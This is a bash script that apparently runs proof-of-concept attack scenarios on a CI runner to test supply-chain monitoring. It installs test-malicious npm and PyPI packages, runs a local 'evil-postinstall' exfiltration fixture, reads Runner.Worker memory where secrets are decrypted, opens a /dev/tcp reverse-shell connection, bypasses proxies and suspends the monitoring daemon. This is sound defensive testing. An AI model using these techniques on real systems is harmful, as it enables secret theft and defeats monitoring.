#!/usr/bin/env bash
# Runs the POC attack scenarios. Each one records what happened in
# $POC_RESULTS/results.jsonl, with start and end times, so the report can match
# PMG and Tetragon events to the scenario. A scenario never fails the step:
# report.py compares the outcome with the expectation for the mode.
set -uo pipefail

: "${POC_RESULTS:?}"
: "${POC_MODE:?}"
fresh="${POC_FRESH_VERSION:-}"
here="$(cd "$(dirname "$0")/.." && pwd)"
mkdir -p "$POC_RESULTS"
results="$POC_RESULTS/results.jsonl"

record() { # id rc detail start end
  python3 - "$@" >>"$results" <<'PY'
import json, sys
id_, rc, detail, start, end = sys.argv[1:6]
print(json.dumps({"id": id_, "rc": int(rc), "detail": detail,
                  "start": float(start), "end": float(end)}))
PY
}

now() { date +%s.%N; }

work=$(mktemp -d)
cd "$work" || exit 1
npm init -y >/dev/null 2>&1

# T1: a known malicious npm package.
s=$(now)
npm install --no-audit --no-fund safedep-test-pkg@0.1.3 >"$POC_RESULTS/t1.log" 2>&1
rc=$?
present=no; [ -d node_modules/safedep-test-pkg ] && present=yes
record T1 "$rc" "installed=$present" "$s" "$(now)"

# T2: a known malicious PyPI package.
s=$(now)
python3 -m venv "$work/venv" >/dev/null 2>&1
"$work/venv/bin/pip" install --disable-pip-version-check --no-cache-dir safedep-test-pkg==0.0.4 >"$POC_RESULTS/t2.log" 2>&1
rc=$?
present=no; "$work/venv/bin/pip" show safedep-test-pkg >/dev/null 2>&1 && present=yes
record T2 "$rc" "installed=$present" "$s" "$(now)"

# T3: a real npm version younger than the cooldown.
s=$(now)
if [ -n "$fresh" ]; then
  npm install --no-audit --no-fund "$fresh" >"$POC_RESULTS/t3.log" 2>&1
  rc=$?
  record T3 "$rc" "package=$fresh" "$s" "$(now)"
else
  record T3 -1 "no fresh version found" "$s" "$(now)"
fi

# T4: a malicious install script that reached the runner without a registry
# download, as from a dependency cache. npm installs it from a local tarball.
s=$(now)
tarball=$(cd "$here/fixtures/evil-postinstall" && npm pack --pack-destination "$work" 2>/dev/null | tail -1)
POC_RESULTS="$POC_RESULTS" npm install --no-audit --no-fund "$work/$tarball" >"$POC_RESULTS/t4.log" 2>&1
rc=$?
https_rc=$(cat "$POC_RESULTS/t4/https-exfil.rc" 2>/dev/null || echo missing)
https_code=$(cat "$POC_RESULTS/t4/https-exfil.http" 2>/dev/null || echo missing)
port_rc=$(cat "$POC_RESULTS/t4/port-8080.rc" 2>/dev/null || echo missing)
record T4 "$rc" "https_rc=$https_rc https_code=$https_code port8080_rc=$port_rc" "$s" "$(now)"

# T5: read the memory of Runner.Worker, where the job's secrets are
# decrypted. Opens /proc/<pid>/mem and reads 16 bytes of one mapping, which it
# discards.
s=$(now)
worker=$(pgrep -f 'Runner.Worker' | head -1)
if [ -n "$worker" ]; then
  sudo python3 - "$worker" >"$POC_RESULTS/t5.log" 2>&1 <<'PY'
import sys
pid = sys.argv[1]
with open(f"/proc/{pid}/maps") as m:
    start = int(m.readline().split("-")[0], 16)
with open(f"/proc/{pid}/mem", "rb") as mem:
    mem.seek(start)
    mem.read(16)
print("read 16 bytes")
PY
  rc=$?
  record T5 "$rc" "worker_pid=$worker" "$s" "$(now)"
else
  record T5 -1 "Runner.Worker not found" "$s" "$(now)"
fi

# T6: a reverse shell to an address no network routes.
s=$(now)
timeout 5 bash -c 'exec 3<>/dev/tcp/192.0.2.10/4444' >"$POC_RESULTS/t6.log" 2>&1
rc=$?
record T6 "$rc" "" "$s" "$(now)"

# T7: a client that drops proxy variables and talks to the registry itself.
s=$(now)
code=$(env -i PATH=/usr/bin:/bin curl -sS -o /dev/null -w '%{http_code}' \
  https://registry.npmjs.org/safedep-test-pkg/-/safedep-test-pkg-0.1.3.tgz 2>"$POC_RESULTS/t7.log")
rc=$?
record T7 "$rc" "http_code=$code" "$s" "$(now)"

# T8: stop and resume the PMG daemon, as a tampering step would.
s=$(now)
pmg_pid=$(pgrep -x pmg | head -1)
if [ -n "$pmg_pid" ]; then
  sudo kill -STOP "$pmg_pid"
  sleep 1
  sudo kill -CONT "$pmg_pid"
  record T8 0 "pmg_pid=$pmg_pid" "$s" "$(now)"
else
  record T8 -1 "no PMG daemon" "$s" "$(now)"
fi

echo "scenarios done: $(wc -l <"$results") results"
